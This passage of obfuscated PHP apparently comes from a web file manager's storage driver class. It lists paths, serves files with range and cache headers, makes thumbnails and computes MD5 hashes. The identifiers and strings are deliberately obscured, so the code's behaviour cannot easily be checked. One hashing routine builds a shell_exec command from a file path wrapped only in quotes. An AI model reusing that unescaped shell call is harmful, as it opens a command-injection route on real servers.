(isset($î„‡’¶é[$ƒ”ôƒ¤[76]])) { $Á Öè¦Œ[$ƒ”ôƒ¤[76]] = $î„‡’¶é[$ƒ”ôƒ¤[76]]; } if (isset($î„‡’¶é[$ƒ”ôƒ¤[85]])) { $Á Öè¦Œ[$ƒ”ôƒ¤[85]] = $î„‡’¶é[$ƒ”ôƒ¤[85]]; } if (!$ƒÎº½ñî) { $³™«­Ë„[] = $Á Öè¦Œ; continue; } $³™«­Ë„[] = $Á Öè¦Œ; $ÔÉÑÅõ = $î„‡’¶é[$ƒ”ôƒ¤[84]]; $Û¬½¨‘ñ = $this->pathDriver; if (substr($î„‡’¶é[$ƒ”ôƒ¤[84]], 0, strlen($Û¬½¨‘ñ)) == $Û¬½¨‘ñ) { $ÔÉÑÅõ = substr($ÔÉÑÅõ, strlen($Û¬½¨‘ñ)); } $this->listAllMake($ÔÉÑÅõ, $³™«­Ë„); } } public function listAllSimple($± øÍÑï, $†¸ƒäê = false) { $ÙŞíí˜§ = $this->listAll($± øÍÑï); return $this->listAllSimpleMake($ÙŞíí˜§, $this->getPathOuter($± øÍÑï), $†¸ƒäê); } public function listAllSimpleMake($Ó…ŒÃ¹¤, $şÙÏğ²­, $£€¬ˆ Ã) { $ë¶òÇÌä =& $_SERVER[§ŒØóıü]; $ãâ¡¡£ò = array(); $şÙÏğ²­ = rtrim(get_path_father($şÙÏğ²­), $ë¶òÇÌä[8]) . $ë¶òÇÌä[8]; foreach ($Ó…ŒÃ¹¤ as $ÓÍÓ§Ï«) { $”ÀãÌË = array($ë¶òÇÌä[84] => $ÓÍÓ§Ï«[$ë¶òÇÌä[84]], $ë¶òÇÌä[86] => $ÓÍÓ§Ï«[$ë¶òÇÌä[84]], $ë¶òÇÌä[75] => $ÓÍÓ§Ï«[$ë¶òÇÌä[75]]); if (isset($ÓÍÓ§Ï«[$ë¶òÇÌä[76]]) && !$ÓÍÓ§Ï«[$ë¶òÇÌä[75]]) { $”ÀãÌË[$ë¶òÇÌä[76]] = $ÓÍÓ§Ï«[$ë¶òÇÌä[76]]; } if (isset($ÓÍÓ§Ï«[$ë¶òÇÌä[85]])) { $”ÀãÌË[$ë¶òÇÌä[85]] = $ÓÍÓ§Ï«[$ë¶òÇÌä[85]]; } if (is_array($ÓÍÓ§Ï«[$ë¶òÇÌä[87]])) { $”ÀãÌË[$ë¶òÇÌä[86]] = $ÓÍÓ§Ï«[$ë¶òÇÌä[87]][$ë¶òÇÌä[84]]; $”ÀãÌË[$ë¶òÇÌä[76]] = $ÓÍÓ§Ï«[$ë¶òÇÌä[87]][$ë¶òÇÌä[76]]; $”ÀãÌË[$ë¶òÇÌä[85]] = $ÓÍÓ§Ï«[$ë¶òÇÌä[87]][$ë¶òÇÌä[85]]; } else { if (substr($ÓÍÓ§Ï«[$ë¶òÇÌä[84]], 0, strlen($şÙÏğ²­)) == $şÙÏğ²­) { $”ÀãÌË[$ë¶òÇÌä[84]] = substr($ÓÍÓ§Ï«[$ë¶òÇÌä[84]], strlen($şÙÏğ²­)); } } $áåÅğş« = $ÓÍÓ§Ï«[$ë¶òÇÌä[75]] ? $ë¶òÇÌä[8] : $ë¶òÇÌä[12]; $”ÀãÌË[$ë¶òÇÌä[86]] = rtrim($”ÀãÌË[$ë¶òÇÌä[86]], $ë¶òÇÌä[8]) . $áåÅğş«; $”ÀãÌË[$ë¶òÇÌä[84]] = $ë¶òÇÌä[8] . trim($”ÀãÌË[$ë¶òÇÌä[84]], $ë¶òÇÌä[8]) . $áåÅğş«; if (!$£€¬ˆ Ã) { $Œ—¦“”Ö = explode($ë¶òÇÌä[8], trim($”ÀãÌË[$ë¶òÇÌä[84]], $ë¶òÇÌä[8])); $”ÀãÌË[$ë¶òÇÌä[84]] = $ë¶òÇÌä[8] . implode($ë¶òÇÌä[8], array_slice($Œ—¦“”Ö, 1)) . $áåÅğş«; } $ãâ¡¡£ò[] = $”ÀãÌË; } return array_sort_by($ãâ¡¡£ò, $ë¶òÇÌä[84]); } public function upload($óßùí™, $®ä£úğé, $–è­µú’ = false, $§ÜÈËø = REPEAT_REPLACE) { } public function uploadFileByID($®ÖĞ¤¾ã, $äÑğéâå, $º•Éµú×) { } public function uploadFileByPath($˜…¦ôõÑ, $ûòÒ´Ó, $ÒÉØÏòÒ = array()) { } public function isUploadServer() { $æëúÚ¿¡ =& $_SERVER[§ŒØóıü]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $æëúÚ¿¡[88]) { return !0; } return $GLOBALS[$æëúÚ¿¡[6]][$æëúÚ¿¡[89]][$æëúÚ¿¡[90]]; } public function isFileOutServer() { $»ë¼——‡ =& $_SERVER[§ŒØóıü]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $»ë¼——‡[88]) { return !0; } return $GLOBALS[$»ë¼——‡[6]][$»ë¼——‡[89]][$»ë¼——‡[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($›ø«í¡ı) { $·…šŒ½İ =& $_SERVER[§ŒØóıü]; if (!$this->isCdnHost()) { return $›ø«í¡ı; } return str_replace(trim(get_url_root($›ø«í¡ı), $·…šŒ½İ[8]), trim($this->cdnHost, $·…šŒ½İ[8]), $›ø«í¡ı); } public function uploadLink($…“áË»©, $ÁÀŸÌ‡˜ = 0) { $šİÓ™ßÃ =& $_SERVER[§ŒØóıü]; if ($this->isUploadServer()) { return; } $Œ—æèÈù = $this->getType(); if (!in_array($Œ—æèÈù, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $«‰Åû¸ = 1024 * 1024 * 10; $­Ä«ËÎÇ = $ÁÀŸÌ‡˜ <= $«‰Åû¸ ? $šİÓ™ßÃ[92] : $šİÓ™ßÃ[93]; $½´­İÈ = (!$ÁÀŸÌ‡˜ ? 1 : ceil($ÁÀŸÌ‡˜ / pow(1024, 3))) * 3600 * 4; $É³À¼î = $this->{$­Ä«ËÎÇ}($…“áË»©, $½´­İÈ); if ($É³À¼î) { $É³À¼î[$šİÓ™ßÃ[94]] = $…“áË»©; $É³À¼î[$šİÓ™ßÃ[95]] = $Œ—æèÈù; } return $É³À¼î; } public function uploadFormData($İ®™ìî¼, $ÌƒÓÕÆ† = 3600) { } public function multiUploadFormData($ßõ—Ş¸×, $ºšì ¤„ = 3600) { } public function download($êÊ„ûŸ¡, $˜ƒ¹Üª) { } public function ext($¡Ğ²à§„) { $ÏüÃ¨á¹ =& $_SERVER[§ŒØóıü]; if (strpos($¡Ğ²à§„, $ÏüÃ¨á¹[8]) === -1) { $“ô°‡Ïº = $¡Ğ²à§„; } else { $“ô°‡Ïº = $this->pathThis($¡Ğ²à§„); } $õëî¾Ôí = $ÏüÃ¨á¹[12]; if (strstr($“ô°‡Ïº, $ÏüÃ¨á¹[10])) { $õëî¾Ôí = substr($“ô°‡Ïº, strrpos($“ô°‡Ïº, $ÏüÃ¨á¹[10]) + 1); $õëî¾Ôí = strtolower($õëî¾Ôí); } if (strlen($õëî¾Ôí) > 3 && preg_match($ÏüÃ¨á¹[96], $õëî¾Ôí, $´Ë›ÚÖ®)) { $õëî¾Ôí = $ÏüÃ¨á¹[12]; } return $õëî¾Ôí; } public function pathThis($¼„úÏÀ) { $» ­ºì… =& $_SERVER[§ŒØóıü]; $¼„úÏÀ = str_replace($» ­ºì…[97], $» ­ºì…[8], rtrim($¼„úÏÀ, $» ­ºì…[8])); $Ñ¶âêº“ = strrpos($¼„úÏÀ, $» ­ºì…[8]); if ($Ñ¶âêº“ === !1) { return $¼„úÏÀ; } return substr($¼„úÏÀ, $Ñ¶âêº“ + 1); } public function pathFather($ääÉü¸¥) { $­­ËÒ à =& $_SERVER[§ŒØóıü]; $ääÉü¸¥ = str_replace($­­ËÒ à[97], $­­ËÒ à[8], rtrim($ääÉü¸¥, $­­ËÒ à[8])); $Ù„¿·ƒö = strrpos($ääÉü¸¥, $­­ËÒ à[8]); if ($Ù„¿·ƒö === !1) { return $­­ËÒ à[12]; } return substr($ääÉü¸¥, 0, $Ù„¿·ƒö + 1); } public function hashSimple($¡è«ıÍğ) { $ÅğÉÇ„í =& $_SERVER[§ŒØóıü]; if (!$¡è«ıÍğ) { return md5($ÅğÉÇ„í[12]); } $³ßßâÁ¾ = $this->size($¡è«ıÍğ); $Áçı´òû = 200; $ÏâÁ¡êØ = 50; if ($³ßßâÁ¾ <= $Áçı´òû * $ÏâÁ¡êØ) { return $this->hashMd5($¡è«ıÍğ) . $³ßßâÁ¾; } $Ç ı™ŒÕ = intval($³ßßâÁ¾ / $ÏâÁ¡êØ); $÷Óº¢™ = $ÅğÉÇ„í[12]; for ($ÉÂòìòà = 0; $ÉÂòìòà < $ÏâÁ¡êØ; $ÉÂòìòà++) { $÷Óº¢™ .= $this->fileSubstr($¡è«ıÍğ, $Ç ı™ŒÕ * $ÉÂòìòà, $Áçı´òû); } $÷Óº¢™ .= $this->fileSubstr($¡è«ıÍğ, $³ßßâÁ¾ - $Áçı´òû, $Áçı´òû); return md5($÷Óº¢™) . $³ßßâÁ¾; } public static $md5Cache = array(); public function hashMd5($Ãƒ¿Î³) { if (!$Ãƒ¿Î³) { return md5($_SERVER[§ŒØóıü][12]); } $Ãƒ¿Î³ = $this->iconvSystem($Ãƒ¿Î³); if (isset(self::$md5Cache[$Ãƒ¿Î³])) { return self::$md5Cache[$Ãƒ¿Î³]; } self::$md5Cache[$Ãƒ¿Î³] = $this->hashMd5Shell($Ãƒ¿Î³); if (!self::$md5Cache[$Ãƒ¿Î³]) { self::$md5Cache[$Ãƒ¿Î³] = @md5_file($Ãƒ¿Î³); } return self::$md5Cache[$Ãƒ¿Î³]; } private function hashMd5Shell($¼ÍğºÂ) { $„øÍğ†¤ =& $_SERVER[§ŒØóıü]; if (!$¼ÍğºÂ) { return md5($„øÍğ†¤[12]); } if (!function_exists($„øÍğ†¤[98])) { return !1; } $º·´ØÏˆ = array($„øÍğ†¤[99], $„øÍğ†¤[100]); $æõûÀ  = Cache::get($„øÍğ†¤[101]); if (!$æõûÀ ) { $õùÑ¤øŒ = BASIC_PATH . $„øÍğ†¤[102]; $ã­ó¬£ = md5_file($õùÑ¤øŒ); $æõûÀ  = $„øÍğ†¤[103]; foreach ($º·´ØÏˆ as $„£¶Íğå) { $¸’Ø“¤ = shell_exec($„£¶Íğå . "\x20\42{$õùÑ¤øŒ}\42"); if ($¸’Ø“¤ && substr(trim($¸’Ø“¤), 0, 32) == $ã­ó¬£) { $æõûÀ  = $„£¶Íğå; break; } } Cache::set($„øÍğ†¤[101], $æõûÀ , 3600); } if ($æõûÀ  == $„øÍğ†¤[103]) { return !1; } $¸’Ø“¤ = shell_exec($æõûÀ  . "\40\42{$¼ÍğºÂ}\x22"); $¸’Ø“¤ = str_replace($„øÍğ†¤[104], $„øÍğ†¤[12], $¸’Ø“¤); return substr($¸’Ø“¤, 0, 32); } public function link($õ­Ñ˜Äê) { return $õ­Ñ˜Äê; } public function fileOut($êÎîŠÙĞ, $—Ëõ¨š = false, $³¡Ş®ßİ = false, $úÊÆ¡ò‹ = '') { $™ŞûôÃê =& $_SERVER[§ŒØóıü]; $this->cacheMethod(null, null); if (!$êÎîŠÙĞ || !$this->exist($êÎîŠÙĞ)) { show_json(LNG($™ŞûôÃê[105]), !1, $³¡Ş®ßİ); } $¬„ùıºÒ = $this->getType() == $™ŞûôÃê[106]; $º¨åü¤ = $GLOBALS[$™ŞûôÃê[6]][$™ŞûôÃê[89]][$™ŞûôÃê[107]][$™ŞûôÃê[108]]; $ıúèş¬ = (double) $GLOBALS[$™ŞûôÃê[6]][$™ŞûôÃê[89]][$™ŞûôÃê[107]][$™ŞûôÃê[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $äª¥…ç˜ = $this->infoFull($êÎîŠÙĞ); $¾‰•°–ë = $äª¥…ç˜[$™ŞûôÃê[76]]; $Ñ“Á™Æ¾ = gmdate($™ŞûôÃê[110], $äª¥…ç˜[$™ŞûôÃê[85]]); $ú©àüÖü = $³¡Ş®ßİ ? $³¡Ş®ßİ : $this->iconvApp($äª¥…ç˜[$™ŞûôÃê[32]]); $Îó¬µ¨ = 0; $´àğúÙš = $¾‰•°–ë - 1; $â‘”ö… = $this->ext($ú©àüÖü); if (in_array($â‘”ö…, array($™ŞûôÃê[111], $™ŞûôÃê[112], $™ŞûôÃê[113], $™ŞûôÃê[114]))) { $â‘”ö… = $™ŞûôÃê[115]; } if (in_array($â‘”ö…, array($™ŞûôÃê[116]))) { $â‘”ö… = $™ŞûôÃê[117]; } if (!$úÊÆ¡ò‹) { $úÊÆ¡ò‹ = md5($Ñ“Á™Æ¾ . $this->hashSimple($êÎîŠÙĞ)); } $úÊÆ¡ò‹ = $™ŞûôÃê[118] . $úÊÆ¡ò‹ . $™ŞûôÃê[118]; $é›¬‘ª€ = get_file_mime($â‘”ö…); $ü“Ä¿ = !0; $ü“Ä¿ = isset($_GET[$™ŞûôÃê[119]]) ? !1 : !0; if ($—Ëõ¨š === !1 && !mime_support($é›¬‘ª€)) { $é›¬‘ª€ = $™ŞûôÃê[120]; } header($™ŞûôÃê[121]); header($™ŞûôÃê[122] . $é›¬‘ª€); $¸òğÍ­ö = rawurlencode($ú©àüÖü); $¸òğÍ­ö = $™ŞûôÃê[118] . $¸òğÍ­ö . $™ŞûôÃê[123] . $¸òğÍ­ö; if ($—Ëõ¨š) { header($™ŞûôÃê[124]); header($™ŞûôÃê[125] . $¸òğÍ­ö); } else { if ($ü“Ä¿) { header($™ŞûôÃê[126] . $¸òğÍ­ö); } } header($™ŞûôÃê[127] . gmdate($™ŞûôÃê[110], time() + 3600 * 24 * 30) . $™ŞûôÃê[128]); header($™ŞûôÃê[129]); header($™ŞûôÃê[130]); header($™ŞûôÃê[131]); if (isset($_SERVER[$™ŞûôÃê[132]]) && strtotime($_SERVER[$™ŞûôÃê[132]]) == $äª¥…ç˜[$™ŞûôÃê[85]]) { header($™ŞûôÃê[133], !0, 304); die; } if (isset($_SERVER[$™ŞûôÃê[134]]) && $_SERVER[$™ŞûôÃê[134]] == $úÊÆ¡ò‹) { header($™ŞûôÃê[135] . $úÊÆ¡ò‹, !0, 304); die; } header($™ŞûôÃê[135] . $úÊÆ¡ò‹); header($™ŞûôÃê[136] . $Ñ“Á™Æ¾ . $™ŞûôÃê[128]); header($™ŞûôÃê[137] . $ú©àüÖü); header($™ŞûôÃê[138]); header($™ŞûôÃê[139] . $¾‰•°–ë); header($™ŞûôÃê[140]); if (!$—Ëõ¨š && $â‘”ö… == $™ŞûôÃê[141]) { if ($¾‰•°–ë > 1024 * 1024 * 5) { die; } $ƒ¯İåû© = $this->getContent($êÎîŠÙĞ); $ƒ¯İåû© = Html::clearSVG($ƒ¯İåû©); header($™ŞûôÃê[142] . strlen($ƒ¯İåû©)); echo $ƒ¯İåû©; die; } $°ä’Öàú = strtolower($_SERVER[$™ŞûôÃê[143]]); if ($¬„ùıºÒ && $°ä’Öàú && $º¨åü¤) { if (strstr($°ä’Öàú, $™ŞûôÃê[144])) { header($™ŞûôÃê[145] . $êÎîŠÙĞ); } else { if (strstr($°ä’Öàú, $™ŞûôÃê[146])) { header($™ŞûôÃê[147] . $êÎîŠÙĞ); } else { if (strstr($°ä’Öàú, $™ŞûôÃê[148])) { header($™ŞûôÃê[149] . $êÎîŠÙĞ); } } } if ($ıúèş¬) { header($™ŞûôÃê[150] . $ıúèş¬); } return; } if (isset($_SERVER[$™ŞûôÃê[151]])) { if (preg_match($™ŞûôÃê[152], $_SERVER[$™ŞûôÃê[151]], $…¢êä€£)) { $Îó¬µ¨ = intval($…¢êä€£[1]); $Îó¬µ¨ = $Îó¬µ¨ <= 0 ? 0 : ($Îó¬µ¨ >= $´àğúÙš ? $´àğúÙš : $Îó¬µ¨); if (!empty($…¢êä€£[2])) { $÷‡¢üóª = intval($…¢êä€£[2]); $´àğúÙš = $÷‡¢üóª < $Îó¬µ¨ ? $Îó¬µ¨ : ($÷‡¢üóª >= $´àğúÙš ? $´àğúÙš : $÷‡¢üóª); } } header($™ŞûôÃê[153]); header("\x43\157\x6e\164\145\156\164\55\x52\x61\x6e\147\145\x3a\40\142\x79\x74\x65\x73\x20{$Îó¬µ¨}\55{$´àğúÙš}\57" . $¾‰•°–ë); } else { header($™ŞûôÃê[154]); } header($™ŞûôÃê[155]); $ï¦–•™ë = !0; if ($_SERVER[$™ŞûôÃê[156]] == $™ŞûôÃê[157] && $¾‰•°–ë > 1204 * 1024 * 1024 * 2) { $ï¦–•™ë = !1; } if ($ï¦–•™ë) { header($™ŞûôÃê[158] . ($´àğúÙš - $Îó¬µ¨ + 1)); } if ($_SERVER[$™ŞûôÃê[159]] == $™ŞûôÃê[160]) { return; } $ªŞ®¤¾ = 1024 * 100; $±¤õ­ƒ¡ = 0; if ($ıúèş¬) { $±¤õ­ƒ¡ = intval(1000 * 1000 * ($ªŞ®¤¾ / $ıúèş¬)); } while ($Îó¬µ¨ <= $´àğúÙš) { $¬§ø ¿¿ = timeFloat(); check_abort(); $àŒ®’„ª = $´àğúÙš - $Îó¬µ¨ + 1; if ($àŒ®’„ª <= $ªŞ®¤¾) { $ªŞ®¤¾ = $àŒ®’„ª; } echo $this->fileSubstr($êÎîŠÙĞ, $Îó¬µ¨, $ªŞ®¤¾); $Îó¬µ¨ += $ªŞ®¤¾; if ($ªŞ®¤¾ == $àŒ®’„ª) { $Îó¬µ¨ = $´àğúÙš + 1; } if ($±¤õ­ƒ¡) { $±œÆÊ×ä = intval(1000 * 1000 * (timeFloat() - $¬§ø ¿¿)); $¸¡‰¨È¼ = $±¤õ­ƒ¡ - $±œÆÊ×ä; if ($¸¡‰¨È¼ > 5) { usleep($¸¡‰¨È¼); } } } } public function fileOutServer($ÅÓÙ“ÁÕ, $°îÉ¯Å” = false, $–ğ¯ÆÛÈ = false, $ôíÎ½Ôé = '') { $this->fileOut($ÅÓÙ“ÁÕ, $°îÉ¯Å”, $–ğ¯ÆÛÈ, $ôíÎ½Ôé); } public function fileOutLink($ÀğØùéÎ) { header($_SERVER[§ŒØóıü][161] . $ÀğØùéÎ); die; } public function cacheMethod($ºø¼éó, $Å’‰ªÚš, $µÜÒÇ– = null) { $£“µàÇó =& $_SERVER[§ŒØóıü]; static $ı´µ¦Ğ = array(); $ôŸŒÓÑŸ = $Å’‰ªÚš ? ltrim($this->getPathOuter($Å’‰ªÚš), $£“µàÇó[8]) : $£“µàÇó[12]; $¶êÛœª€ = $£“µàÇó[162] . $ºø¼éó . $£“µàÇó[163] . rtrim($ôŸŒÓÑŸ, $£“µàÇó[8]); if (is_null($ºø¼éó)) { $ı´µ¦Ğ = array(); return; } if (is_null($Å’‰ªÚš)) { foreach ($ı´µ¦Ğ as $¶êÛœª€ => $§ûë¥’è) { if (!strstr($¶êÛœª€, $£“µàÇó[162] . $ºø¼éó . $£“µàÇó[164])) { continue; } unset($ı´µ¦Ğ[$¶êÛœª€]); } return; } if (!is_null($µÜÒÇ–)) { $ı´µ¦Ğ[$¶êÛœª€] = $µÜÒÇ–; return; } $Í¥âØš = isset($ı´µ¦Ğ[$¶êÛœª€]) ? $ı´µ¦Ğ[$¶êÛœª€] : null; if (!is_null($Í¥âØš)) { return $Í¥âØš; } $Í¥âØš = $this->{$ºø¼éó}($Å’‰ªÚš); $ı´µ¦Ğ[$¶êÛœª€] = $Í¥âØš; return $Í¥âØš; } public function cacheMethodInfoSet($ ‹·åÄ, $‹¦Â½¹, $ó“¡éƒ = false) { $ØÇï­˜Û =& $_SERVER[§ŒØóıü]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ØÇï­˜Û[165], $ ‹·åÄ, $‹¦Â½¹); $this->cacheMethod($ØÇï­˜Û[166], $ ‹·åÄ, $‹¦Â½¹ ? !1 : !0); if (is_array($ó“¡éƒ)) { $this->cacheMethod($ØÇï­˜Û[167], $ ‹·åÄ, $ó“¡éƒ); } } public function fileOutImage($Ê½ÚùÆÎ, $ıáÑ¡İ = 250) { $ÜÕığÎ =& $_SERVER[§ŒØóıü]; set_timeout(); if (substr($Ê½ÚùÆÎ, 0, 4) == $ÜÕığÎ[148]) { $this->fileOutLink($Ê½ÚùÆÎ); } $ôì€§àû = $this->info($Ê½ÚùÆÎ); $˜Åü¶Âê = $ôì€§àû[$ÜÕığÎ[32]]; $ÔœÆêãÆ = !1; if (isset($GLOBALS[$ÜÕığÎ[168]]) && $GLOBALS[$ÜÕığÎ[168]][$ÜÕığÎ[84]] == $ôì€§àû[$ÜÕığÎ[84]]) { $ãÖ§ë¤Ó = $GLOBALS[$ÜÕığÎ[168]][$ÜÕığÎ[169]]; if (!$ôì€§àû[$ÜÕığÎ[170]]) { $ôì€§àû[$ÜÕığÎ[170]] = $GLOBALS[$ÜÕığÎ[168]]; } if (isset($ãÖ§ë¤Ó[$ÜÕığÎ[171]])) { if ($ãÖ§ë¤Ó[$ÜÕığÎ[171]] <= $ıáÑ¡İ && $ãÖ§ë¤Ó[$ÜÕığÎ[172]] <= $ıáÑ¡İ) { $ÔœÆêãÆ = !0; } } $˜Åü¶Âê = $ôì€§àû[$ÜÕığÎ[170]][$ÜÕığÎ[32]]; } if ($ôì€§àû[$ÜÕığÎ[76]] <= 1024 * 50 || $ÔœÆêãÆ || !function_exists($ÜÕığÎ[173]) || $ôì€§àû[$ÜÕığÎ[174]] == $ÜÕığÎ[175]) { return $this->fileOut($Ê½ÚùÆÎ, !1, $˜Åü¶Âê); } if (isset($ôì€§àû[$ÜÕığÎ[170]][$ÜÕığÎ[176]])) { $ÀÚÀëã¡ = $ôì€§àû[$ÜÕığÎ[170]][$ÜÕığÎ[176]]; } else { if (isset($ôì€§àû[$ÜÕığÎ[170]][$ÜÕığÎ[177]])) { $ÀÚÀëã¡ = $ôì€§àû[$ÜÕığÎ[170]][$ÜÕığÎ[177]]; } } if (!$ÀÚÀëã¡) { $ÀÚÀëã¡ = md5("{$ôì€§àû[$ÜÕığÎ[32]]}\137{$ôì€§àû[$ÜÕığÎ[84]]}\137{$ôì€§àû[$ÜÕığÎ[76]]}\137{$ıáÑ¡İ}"); } $•—Öş§ = "{$ÀÚÀëã¡}\137{$ıáÑ¡İ}\56\x70\x6e\x67"; if (!($£ŠŠ•¤Å = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ÜÕığÎ[178]))) { $Åµèû§ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ÜÕığÎ[179]); } else { $Åµèû§ = KodIO::make($£ŠŠ•¤Å); } if ($£ŠŠ•¤Å = IO::fileNameExist($Åµèû§, $•—Öş§)) { $Îµæ¼äÑ = KodIO::make($£ŠŠ•¤Å); return IO::fileOut($Îµæ¼äÑ, !1, $˜Åü¶Âê); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Îµæ¼äÑ = DATA_THUMB . $•—Öş§; del_file($Îµæ¼äÑ); if (!@file_exists($Îµæ¼äÑ)) { $Í´¦¨±Ÿ = TEMP_FILES; if (!is_dir($Í´¦¨±Ÿ)) { mk_dir($Í´¦¨±Ÿ); } $ÍŒ²™Î = $Í´¦¨±Ÿ . $ÀÚÀëã¡ . $ÜÕığÎ[10] . $ôì€§àû[$ÜÕığÎ[174]]; if (!@file_exists($ÍŒ²™Î)) { $ÍŒ²™Î = $this->download($Ê½ÚùÆÎ, $ÍŒ²™Î); } ImageThumb::createThumb($ÍŒ²™Î, $Îµæ¼äÑ, $ıáÑ¡İ, $ıáÑ¡İ * 10); } if (!file_exists($Îµæ¼äÑ) || filesize($Îµæ¼äÑ) < 100) { return @file_exists($ÍŒ²™Î) ? IO::fileOut($ÍŒ²™Î) : $this->fileOut($Ê½ÚùÆÎ); } if (!($ì”ˆ¤˜× = IO::move($Îµæ¼äÑ, $Åµèû§))) { return IO::fileOut($Îµæ¼äÑ); } del_file($Îµæ¼äÑ); IO::fileOut($ì”ˆ¤˜×); } public function fileOutImageServer($ï‰ÙóŒĞ, $¡ÌÈ·õã = 250) { $this->fileOutImage($ï‰ÙóŒĞ, $¡ÌÈ·õã); } public function fileNameAuto($¬ã•ïß€, $ƒ¨Ã¬ı”, $§–Í¼ãÑ = REPEAT_RENAME, $¡ìıú– = false) { $ú¾ÌÏ· =& $_SERVER[§ŒØóıü]; $ÀÎıù®´ = $¬ã•ïß€ === $ú¾ÌÏ·[12] ? $ƒ¨Ã¬ı” : rtrim($¬ã•ïß€, $ú¾ÌÏ·[8]) . $ú¾ÌÏ·[8] . $ƒ¨Ã¬ı”; if ($§–Í¼ãÑ == REPEAT_REPLACE || !$this->exist($ÀÎıù®´) || $¡ìıú– && $§–Í¼ãÑ != REPEAT_RENAME_FOLDER) { return $ƒ¨Ã¬ı”; } if ($§–Í¼ãÑ == REPEAT_SKIP) { return !1; } $·«‰»³­ = $ú¾ÌÏ·[10] . get_path_ext($ƒ¨Ã¬ı”); $·«‰»³­ = $·«‰»³­ == $ú¾ÌÏ·[10] || $¡ìıú– ? $ú¾ÌÏ·[12] : $·«‰»³­; $ú”€ü–½ = 1; $¨Æƒ¬Ë = substr($ƒ¨Ã¬ı”, 0, strlen($ƒ¨Ã¬ı”) - strlen($·«‰»³­)); $ª¯÷óğÇ = $¨Æƒ¬Ë . "\50{$ú”€ü–½}\x29{$·«‰»³­}"; while ($this->exist(rtrim($¬ã•ïß€, $ú¾ÌÏ·[8]) . $ú¾ÌÏ·[8] . $ª¯÷óğÇ)) { $ª¯÷óğÇ = $¨Æƒ¬Ë . "\x28{$ú”€ü–½}\x29{$·«‰»³­}"; $ú”€ü–½++; } return $ª¯÷óğÇ; } private function fileNameAutoList($îéÜÄ×†, $±Ò¼›áØ, $óş´éŸÕ = false) { $’Šã¶„ˆ =& $_SERVER[§ŒØóıü]; $Òš’¤şÆ = $this->listPath($îéÜÄ×†, !0); $Òš’¤şÆ = array_merge($Òš’¤şÆ[$’Šã¶„ˆ[82]], $Òš’¤şÆ[$’Šã¶„ˆ[83]]); $òòßÖ¥Œ = array_to_keyvalue($Òš’¤şÆ, $’Šã¶„ˆ[12], $’Šã¶„ˆ[32]); $Ö»†Óëğ = $’Šã¶„ˆ[10] . get_path_ext($±Ò¼›áØ); $Ö»†Óëğ = $Ö»†Óëğ == $’Šã¶„ˆ[10] || $óş´éŸÕ ? $’Šã¶„ˆ[12] : $Ö»†Óëğ; $’×Œ×ò¬ = substr($±Ò¼›áØ, 0, strlen($±Ò¼›áØ) - strlen($Ö»†Óëğ)); $öÂÓšëç = $’×Œ×ò¬ . "\50\60\x29{$Ö»†Óëğ}"; for ($¬›ÅÊúÒ = 1; $¬›ÅÊúÒ <= count($òòßÖ¥Œ) + 1; $¬›ÅÊúÒ++) { $öÂÓšëç = $’×Œ×ò¬ . "\50{$¬›ÅÊúÒ}\51{$Ö»†Óëğ}"; if (!in_array_not_case($öÂÓšëç, $òòßÖ¥Œ)) { return $öÂÓšëç; } } return $öÂÓšëç; } public function listAllFiles($ÄëÜ¯Şê, $ç“Ã¼±ü) { $ˆ’À¶©Í =& $_SERVER[§ŒØóıü]; if (empty($ç“Ã¼±ü)) { return array(); } $î°î—– = array_keys($ç“Ã¼±ü); $ñ¿âò¿„ = array(); $ÄëÜ¯Şê = trim($ÄëÜ¯Şê, $ˆ’À¶©Í[8]); foreach ($ç“Ã¼±ü as $½åˆğ· => $¨€Îôâ”) { $‘¶ÖçÃó = ltrim(substr(trim($½åˆğ·, $ˆ’À¶©Í[8]), strlen($ÄëÜ¯Şê)), $ˆ’À¶©Í[8]); if (substr($½åˆğ·, -1) == $ˆ’À¶©Í[8]) { $‘¶ÖçÃó = rtrim($‘¶ÖçÃó, $ˆ’À¶©Í[8]) . $ˆ’À¶©Í[8]; } $ñ¿âò¿„ = array_merge($ñ¿âò¿„, $this->slicePath($‘¶ÖçÃó)); } $œìÛÚÈ¬ = array(); foreach (array_unique($ñ¿âò¿„) as $±½£§’) { $äÆ˜ôƒæ = array($ˆ’À¶©Í[84] => $this->getPathOuter($ˆ’À¶©Í[8] . $ÄëÜ¯Şê . $ˆ’À¶©Í[8] . $±½£§’), $ˆ’À¶©Í[75] => 1, $ˆ’À¶©Í[76] => 0); if (substr($±½£§’, -1) != $ˆ’À¶©Í[8]) { $äÆ˜ôƒæ[$ˆ’À¶©Í[75]] = 0; $­“ßÏ = $this->getPath($ÄëÜ¯Şê . $ˆ’À¶©Í[8] . $±½£§’); if (isset($ç“Ã¼±ü[$­“ßÏ])) { $ÕîÎ© = $ç“Ã¼±ü[$­“ßÏ]; if (isset($ÕîÎ©[$ˆ’À¶©Í[76]])) { $äÆ˜ôƒæ[$ˆ’À¶©Í[76]] = intval($ÕîÎ©[$ˆ’À¶©Í[76]]); } if (isset($ÕîÎ©[$ˆ’À¶©Í[180]])) { $äÆ˜ôƒæ[$ˆ’À¶©Í[85]] = intval($ÕîÎ©[$ˆ’À¶©Í[180]]); } } } $œìÛÚÈ¬[] = $äÆ˜ôƒæ; } return $œìÛÚÈ¬; } public function slicePath($Ğ¡Û) { $–±÷Ô„¯ =& $_SERVER[§ŒØóıü]; $ÜÒÂ¢„ƒ = explode($–±÷Ô„¯[8], trim($Ğ¡Û, $–±÷Ô„¯[8])); $İğüŠ­Ş = 0; do { ++$İğüŠ­Ş; $‡éĞšâ[] = implode($–±÷Ô„¯[8], array_slice($ÜÒÂ¢„ƒ, 0, $İğüŠ­Ş)) . $–±÷Ô„¯[8]; } while ($İğüŠ­Ş < count($ÜÒÂ¢„ƒ)); $‡éĞšâ[count($ÜÒÂ¢„ƒ) - 1] = $Ğ¡Û; return $‡éĞšâ; } public function getHost() { $Ãø†“ÌË =& $_SERVER[§ŒØóıü]; $ÇÁœöÌ„ = parse_url(trim($this->domain, $Ãø†“ÌË[8])); 